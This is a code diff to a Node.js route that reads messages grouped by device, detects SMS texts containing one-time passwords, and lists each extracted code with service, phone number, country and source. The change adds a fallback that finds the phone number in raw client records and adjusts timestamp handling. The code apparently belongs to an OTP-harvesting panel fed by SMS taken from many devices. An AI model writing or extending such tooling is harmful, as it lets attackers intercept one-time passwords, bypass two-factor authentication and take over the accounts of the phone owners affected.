@@ -62,20 +62,29 @@ router.get("/", async (req, res, next) => {
             for (const [deviceId, deviceMessages] of Object.entries(messagesRoot)) {
               if (!deviceMessages || typeof deviceMessages !== "object") continue;
               const device = devices.find((d) => d.id === deviceId) || { id: deviceId, phoneNumber: "—" };
-              const phone = OtpExtractor.extractPhoneNumber(device, Object.values(deviceMessages));
+              const msgArray = Object.values(deviceMessages);
+              let phone = OtpExtractor.extractPhoneNumber(device, msgArray);
+
+              // Also try raw client data for phone
+              if (!phone && clientsData && clientsData[deviceId]) {
+                const raw = clientsData[deviceId];
+                const rp = raw.phoneNumber || raw.phone || raw.number || raw.mobileNumber || raw.mobile || raw.phoneNo || "";
+                if (rp && rp !== "—") phone = String(rp).replace(/[^0-9]/g, "");
+              }
+
               for (const [, msg] of Object.entries(deviceMessages)) {
                 if (!msg || typeof msg !== "object") continue;
                 const text = msg.text || msg.body || msg.message || "";
                 if (!OtpExtractor.isOtpMessage(text)) continue;
                 const extracted = OtpExtractor.extractOtp(text);
                 if (!extracted) continue;
-                const ts = msg.timestamp || msg.time || new Date().toISOString();
+                const rawTs = msg.timestamp || msg.time || msg.date || "";
                 otps.push({
                   service: extracted.service,
                   phone: phone || "Unknown",
                   code: extracted.code,
                   message: text.trim().slice(0, 200),
-                  timestamp: typeof ts === "number" ? new Date(ts).toISOString() : String(ts),
+                  timestamp: rawTs ? (typeof rawTs === "number" ? new Date(rawTs).toISOString() : String(rawTs)) : new Date().toISOString(),
                   country: OtpExtractor.detectCountry(phone),
                   source: conn.name,
                 });
